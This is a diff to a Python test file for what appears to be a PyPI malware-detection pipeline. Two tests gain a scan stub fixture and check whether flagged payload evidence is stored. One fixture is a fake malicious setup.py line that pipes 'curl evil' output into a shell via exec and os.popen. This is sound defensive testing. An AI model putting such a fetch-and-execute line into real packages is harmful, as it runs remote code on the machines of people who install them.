@@ -43,7 +43,7 @@ def _artifactset(new_files, prior_files):
                        added_dep_findings=[])
 
 
-def test_process_fetched_captures_payload_evidence(tmp_path):
+def test_process_fetched_captures_payload_evidence(tmp_path, scan_stub):
     # A flagged code change must leave the actual payload in releases.evidence (self-contained for a
     # PyPI takedown report — survives the package being pulled and re-fetch failing). With a reviewer: with none,
     # nothing is stored and the drain's rebuild stores it (spec B decision 3, tests/test_no_heuristic_alerts.py).
@@ -52,16 +52,17 @@ def test_process_fetched_captures_payload_evidence(tmp_path):
     art = _artifactset({"setup.py": b"import os\nexec(os.popen('curl evil|sh').read())\n"},
                        {"setup.py": b"import os\n"})
     orchestrator._process_fetched(cfg, conn, reviewer.Reviewer(cfg, backend=object()), orchestrator._load_ruleset(cfg),
-                                  NewRelease("p", "1.1", 5), art, offline=True)   # parked: the model is not called
+                                  NewRelease("p", "1.1", 5), scan_stub.dl(art), offline=True)   # parked: the model is not called
     ev = store.get_evidence(conn, conn.execute("SELECT id FROM releases WHERE package='p' AND version='1.1'").fetchone()[0])
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
 
-def test_process_fetched_leaves_evidence_null_when_benign(tmp_path):
+def test_process_fetched_leaves_evidence_null_when_benign(tmp_path, scan_stub):
     cfg = Config(db_path=tmp_path / "o.sqlite", lock_path=tmp_path / "lk", reviewer_enabled=False)
     conn = store.connect(cfg); store.init_schema(conn)
     art = _artifactset({"util.py": b"x = 1\ny = 2\n"}, {"util.py": b"x = 1\n"})
-    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
+    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5),
+                                  scan_stub.dl(art))
     ev = conn.execute("SELECT evidence FROM releases WHERE package='p' AND version='1.1'").fetchone()[0]
     assert ev is None
 
